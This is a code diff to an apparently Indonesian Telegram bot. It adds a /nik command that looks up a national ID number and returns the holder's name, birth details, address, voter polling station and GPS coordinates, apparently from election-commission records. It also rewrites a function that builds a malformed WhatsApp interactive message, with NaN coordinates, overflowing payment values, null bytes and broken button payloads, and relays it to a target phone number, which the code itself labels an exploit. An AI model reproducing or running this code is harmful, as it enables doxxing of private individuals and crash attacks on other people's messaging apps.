@@ -85,6 +85,7 @@ const chalk = require('chalk');
 const axios = require('axios');
 const path = require("path");
 const moment = require('moment-timezone');
+const NIKChecker = require('./nik-checker');
 //S
 
 const {
@@ -1488,6 +1489,176 @@ function formatPhoneNumber(number) {
   return cleaned;
 }
 //s
+bot.command('nik', async (ctx) => {
+  const chatId = ctx.chat.id;
+  const input = ctx.message.text.replace('/nik', '').trim(); 
+  if (!input) {
+    const errorMessage = `
+❌ *Cara Penggunaan:*
+
+\`/nik <16_digit_NIK>\`
+
+*Contoh:*
+\`/nik 3202285909840005\`
+
+@zihardev
+    `;
+    return bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
+  }
+  
+  const nik = input.replace(/\s/g, '');
+  if (!/^[0-9]{16}$/.test(nik)) {
+    const errorMessage = `
+❌ *NIK tidak valid!*
+NIK harus:
+• Tepat 16 digit
+• Hanya berisi angka
+• Tanpa spasi atau karakter lain
+
+*Contoh yang benar:*
+\`/nik 3202285909840005\`
+
+*Contoh yang salah:*
+❌ \`/nik 320228590984\` (kurang digit)
+❌ \`/nik 3202285909840005X\` (ada huruf)
+❌ \`/nik 3202 2859 0984 0005\` (ada spasi)
+    `;
+    return bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
+  }
+  
+  const loadingMessage = `
+⏳ *Sedang memproses NIK...*
+NIK: \`${nik}\`
+Mohon tunggu sebentar, proses ini membutuhkan waktu sekitar 10-20 detik.
+_Sedang mengambil data dari database..._
+  `;
+  const loadingMsg = await bot.sendMessage(chatId, loadingMessage, { parse_mode: 'Markdown' });
+  try {
+    const result = await nikChecker.checkNIK(nik);  
+    if (result.status === 'error') {
+      const errorResponse = `
+❌ *Gagal memproses NIK*
+
+*NIK:* \`${result.nik}\`
+*Error:* ${result.error}
+💡 *Kemungkinan penyebab:*
+• NIK tidak terdaftar di database
+• Format NIK tidak sesuai dengan wilayah
+• Koneksi ke server KPU bermasalah
+
+Silakan coba lagi atau pastikan NIK yang dimasukkan benar.
+      `;   
+      await bot.editMessageText(errorResponse, {
+        chat_id: chatId,
+        message_id: loadingMsg.message_id,
+        parse_mode: 'Markdown'
+      });
+      return;
+    }
+    const data = result.data;
+    let response = `✅ *DATA NIK BERHASIL DITEMUKAN*\n\n`;
+    response += `📋 *NIK:* \`${result.nik}\`\n`;
+    response += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+    
+    response += `👤 *DATA PRIBADI:*\n`;
+    response += `• *Nama:* ${data.nama}\n`;
+    response += `• *Jenis Kelamin:* ${data.kelamin}\n`;
+    response += `• *Tempat/Tgl Lahir:* ${data.tempat_lahir}\n`;
+    response += `• *Usia:* ${data.usia}\n`;
+    response += `• *Zodiak:* ${data.zodiak}\n`;
+    response += `• *Ultah Berikutnya:* ${data.ultah_mendatang}\n`;
+    response += `• *Hari Pasaran:* ${data.pasaran}\n`;
+    response += `\n`;
+    
+    response += `📍 *DATA WILAYAH:*\n`;
+    response += `• *Provinsi:* ${data.provinsi}\n`;
+    response += `• *Kabupaten/Kota:* ${data.kabupaten}\n`;
+    response += `• *Kecamatan:* ${data.kecamatan}\n`;
+    response += `• *Kelurahan/Desa:* ${data.kelurahan}\n`;
+    response += `\n`;
+    
+    if (data.tps !== 'Tidak ditemukan') {
+      response += `🗳️ *DATA PEMILIH (DPT):*\n`;
+      response += `• *TPS:* ${data.tps}\n`;
+      response += `• *Alamat:* ${data.alamat}\n`;
+      
+      if (data.koordinat.lat && data.koordinat.lon) {
+        response += `• *Koordinat:* ${data.koordinat.lat}, ${data.koordinat.lon}\n`;
+      }
+      
+      if (data.jumlah_lhp) {
+        response += `• *Jumlah LHP:* ${data.jumlah_lhp} record\n`;
+      }
+      response += `\n`;
+    }
+    
+    response += `ℹ️ *METADATA:*\n`;
+    response += `• *Metode:* ${result.metadata.metode_pencarian}\n`;
+    response += `• *Kode Wilayah:* ${result.metadata.kode_wilayah}\n`;
+    response += `• *Nomor Urut:* ${result.metadata.nomor_urut}\n`;
+    response += `• *Kategori Usia:* ${result.metadata.kategori_usia}\n`;
+    response += `• *Jenis Wilayah:* ${result.metadata.jenis_wilayah}\n`;
+    response += `\n`;
+    response += `⏰ *Timestamp:* ${new Date(result.metadata.timestamp).toLocaleString('id-ID')}\n`;
+    response += `━━━━━━━━━━━━━━━━━━━━\n`;
+    response += `\n_Data berhasil diambil dari database KPU_`;
+    
+    await bot.editMessageText(response, {
+      chat_id: chatId,
+      message_id: loadingMsg.message_id,
+      parse_mode: 'Markdown'
+    });
+    
+    if (data.koordinat.lat && data.koordinat.lon) {
+      await bot.sendLocation(chatId, data.koordinat.lat, data.koordinat.lon);
+      await bot.sendMessage(chatId, `📍 *Lokasi TPS*\n\nKoordinat: ${data.koordinat.lat}, ${data.koordinat.lon}`, { parse_mode: 'Markdown' });
+    }
+    
+    if (result.data_lhp && result.data_lhp.length > 0) {
+      let lhpMessage = `📊 *DATA LHP (Laporan Harian Pemilih)*\n\n`;
+      lhpMessage += `Total: ${result.data_lhp.length} record\n`;
+      lhpMessage += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+      
+      result.data_lhp.slice(0, 5).forEach((lhp, index) => {
+        lhpMessage += `*Record ${index + 1}:*\n`;
+        lhpMessage += `• Nama: ${lhp.nama || 'N/A'}\n`;
+        lhpMessage += `• NIK: \`${lhp.nik || 'N/A'}\`\n`;
+        lhpMessage += `• Kecamatan: ${lhp.kecamatan || 'N/A'}\n`;
+        lhpMessage += `• Kelurahan: ${lhp.kelurahan || 'N/A'}\n`;
+        lhpMessage += `• TPS: ${lhp.tps || 'N/A'}\n`;
+        lhpMessage += `\n`;
+      });
+      
+      if (result.data_lhp.length > 5) {
+        lhpMessage += `_... dan ${result.data_lhp.length - 5} record lainnya_\n`;
+      }
+      
+      await bot.sendMessage(chatId, lhpMessage, { parse_mode: 'Markdown' });
+    }
+    
+  } catch (error) {
+    console.error('Error processing NIK:', error);
+    
+    const errorResponse = `
+❌ *Terjadi kesalahan sistem*
+
+*Error:* ${error.message}
+
+💡 *Saran:*
+• Coba lagi dalam beberapa saat
+• Pastikan NIK yang dimasukkan benar
+• Jika masalah berlanjut, hubungi admin
+
+_Error telah dicatat untuk ditindaklanjuti_
+    `;
+    
+    await bot.editMessageText(errorResponse, {
+      chat_id: chatId,
+      message_id: loadingMsg.message_id,
+      parse_mode: 'Markdown'
+    });
+  }
+});
 
 bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
   await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
@@ -1868,84 +2039,241 @@ async function clearChat(target) {
 
 //FANGSYEN
 async function BapakLoe(sock, target) {
-    console.log(`[☕] SENDING TO ${target}...`);
-    const emptyList = []; 
-    const illegalCoord = NaN; 
-    const negativeDuration = -9999999;
-    for (let i = 0; i < 100; i++) { 
+    console.log(`[🤪] SENDING SUKI EXPLOIT TO ${target}...`);  
+    try {
+        await sock.updateProfileName("\u200e");
+    } catch (e) {}
+    const emptyList = [];
+    const illegalCoord = NaN;
+    const negativeDuration = -999999999; 
+    const maxInt = 2147483647; 
+    const payloadList = JSON.stringify({
+        "title": "List",
+        "sections": [
+            {
+                "title": "Section",
+                "rows": [] 
+            }
+        ]
+    }); 
+    const payloadBooking = JSON.stringify({
+        "booking_time": negativeDuration, 
+        "latitude": illegalCoord,
+        "longitude": illegalCoord,
+        "title": "Book",
+        "participant_count": -1 
+    });   
+    const payloadOptOut = JSON.stringify({
+        "title": "OptOut",
+        "topics": null, 
+        "reason": null
+    });  
+    const payloadCall = JSON.stringify({
+        "call_type": "voice", 
+        "call_id": "invalid",
+        "participants": {} 
+    }); 
+    const payloadPayment = JSON.stringify({
+        "name": "payment_info",
+        "currency": "IDR",
+        "total_amount": {
+            "value": maxInt + maxInt, 
+            "offset": 100
+        },
+        "reference_id": "REF",
+        "type": "physical-goods",
+        "order": {
+            "status": "pending",
+            "subtotal": {
+                "value": -1, 
+                "offset": -1  
+            },
+            "items": [
+                {
+                    "quantity": maxInt 
+                }
+            ]
+        }
+    });    
+    const payloadCatalog = JSON.stringify({
+        "title": "Catalog",
+        "products": [null, null, null] 
+    });    
+    const timestamp = Date.now();  
+    for (let i = 0; i < 1; i++) {
         try {
+            const messageId = `3EB0${timestamp.toString(16).toUpperCase()}${Math.random().toString(36).substring(2, 10).toUpperCase()}`;            
             const msg = generateWAMessageFromContent(target, {
                 viewOnceMessage: {
                     message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
                         interactiveMessage: {
                             header: {
-                                title: "FXX",
+                                title: "./comon.dex/java/",
+                                subtitle: "System",
                                 hasMediaAttachment: true,
                                 locationMessage: {
-                                    degreesLatitude: illegalCoord, 
-                                    degreesLongitude: illegalCoord, 
-                                    name: "NullPointerException City",
-                                    address: "Jalan Buntu"
+                                    degreesLatitude: illegalCoord,
+                                    degreesLongitude: illegalCoord,
+                                    name: "\0",
+                                    address: "JAWA SELATAN"
                                 }
                             },
                             body: {
-                                text: "System.out.println('null');"
+                                text: "\0"
                             },
-                            
+                            footer: {
+                                text: "\0"
+                            },
                             carouselMessage: {
                                 cards: [
                                     {
                                         header: {
-                                            title: "Index 0",
+                                            title: "Card 1",
                                             hasMediaAttachment: false
                                         },
-                                        body: { text: "test" },
+                                        body: {
+                                            text: "\0"
+                                        },
                                         nativeFlowMessage: {
-                                            buttons: [{
-                                                name: "cta_url",
-                                                buttonParamsJson: "{\"url\":\"https://google.com\"}"
-                                            }]
+                                            messageParamsJson: payloadPayment,
+                                            buttons: [
+                                                {
+                                                    name: "single_select",
+                                                    buttonParamsJson: payloadList
+                                                },
+                                                {
+                                                    name: "booking_confirmation", 
+                                                    buttonParamsJson: payloadBooking
+                                                }
+                                            ]
+                                        }
+                                    },
+                                    {
+                                        header: {
+                                            title: "Card 2",
+                                            hasMediaAttachment: false
+                                        },
+                                        body: {
+                                            text: "\0"
+                                        },
+                                        nativeFlowMessage: {
+                                            messageParamsJson: payloadPayment,
+                                            buttons: [
+                                                {
+                                                    name: "psi_opt_outs",
+                                                    buttonParamsJson: payloadOptOut
+                                                },
+                                                {
+                                                    name: "call_permission_request",
+                                                    buttonParamsJson: payloadCall
+                                                }
+                                            ]
+                                        }
+                                    },
+                                    {
+                                        header: {
+                                            title: "Card 3",
+                                            hasMediaAttachment: false
+                                        },
+                                        body: {
+                                            text: "\0"
+                                        },
+                                        nativeFlowMessage: {
+                                            messageParamsJson: payloadPayment,
+                                            buttons: [
+                                                {
+                                                    name: "catalog_message",
+                                                    buttonParamsJson: payloadCatalog
+                                                },
+                                                {
+                                                    name: "single_select",
+                                                    buttonParamsJson: payloadList
+                                                }
+                                            ]
                                         }
                                     }
-                                    
                                 ],
                                 messageVersion: 1
                             },
                             contextInfo: {
-                                mentionedJid: emptyList, 
-                                groupMentions: [
-                                    { groupJid: target, groupSubject: "Hii" }
-                                ],
-                                
+                                mentionedJid: [],
+                                groupMentions: [],
                                 isForwarded: true,
-                                forwardingScore: 999,
+                                forwardedNewsletterMessageInfo: {
+                                    newsletterJid: "120363360028149780@newsletter",
+                                    serverMessageId: 1,
+                                    newsletterName: "idk"
+                                },
+                                forwardingScore: 99,
+                                remoteJid: "status@broadcast",
+                                participant: "0@s.whatsapp.net",
                                 quotedMessage: {
                                     audioMessage: {
-                                        url: "https://raw.githubusercontent.com/bayuxxd/bebasajamaukayagmna/main/lagu.mp3",
-                                        mimetype: "audio/mp4",
+                                        url: "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525153031570742_2352761085_n.enc?ccb=11-4&oh=01_Q5AaIGTKSOt4p7yPnClLvCZxAJ5NXOKJNKIJJbGbXp2nrJfp&oe=676A2571&_nc_sid=5e03e0&mms3=true",
+                                        mimetype: "audio/mpeg",
+                                        fileSha256: "ZikIJP35XhNs5KQX4Z1RbBLkWCo1F9J4RJbFdGgKcaI=",
+                                        fileLength: "999999",
                                         seconds: negativeDuration, 
-                                        ptt: true
+                                        ptt: true,
+                                        mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
+                                        fileEncSha256: "sR9J9MNgBLTz7MAhP8umKPdWdZ4IWwJJdSJiPYMeHg8=",
+                                        directPath: "/v/t62.7114-24/56189035_1525153031570742_2352761085_n.enc?ccb=11-4&oh=01_Q5AaIGTKSOt4p7yPnClLvCZxAJ5NXOKJNKIJJbGbXp2nrJfp&oe=676A2571&_nc_sid=5e03e0",
+                                        mediaKeyTimestamp: "1735382602"
                                     }
-                                }
+                                },
+                                externalAdReply: {
+                                    title: "\u0000",
+                                    body: "none",
+                                    mediaType: 1,
+                                    thumbnailUrl: "https://mmg.whatsapp.net",
+                                    sourceUrl: "https://t.me/zihardev",
+                                    showAdAttribution: false,
+                                    renderLargerThumbnail: false
+                                },
+                                stanzaId: undefined,
+                                fromMe: false
                             }
                         }
                     }
                 }
-            }, { 
-                userJid: sock.user.id,
-                quoted: null 
+            }, {
+                userJid: "0@s.whatsapp.net",
+                quoted: null
             });
+            
+            msg.key = {
+                remoteJid: target,
+                fromMe: false,
+                id: messageId,
+                participant: undefined
+            };          
+            delete msg.pushName;
+            delete msg.verifiedBizName;       
+            msg.messageTimestamp = Math.floor(timestamp / 1000) + i;    
             await sock.relayMessage(target, msg.message, {
                 messageId: msg.key.id,
-                participant: { jid: target }
+                participant: undefined,
+                useMessageComposer: false,
+                statusJidList: [],
+                additionalAttributes: {
+                    ephemeralExpiration: 86400
+                }
             });
-            await new Promise(r => setTimeout(r, 500)); 
+
+            await new Promise(r => setTimeout(r, 1000));
+            
         } catch (e) {
-            console.log(`[!] Gagal inject paket ke-${i}:`, e);
+            console.log(`[!] EROR SEND SUKI FIX SENDIRI KONTOL-${i}:`, e);
         }
     }
-    console.log("[✅] Injection Selesai.");
+    
+    console.log("SUKI DONE!");
 }
+
 
 
 bot.launch({
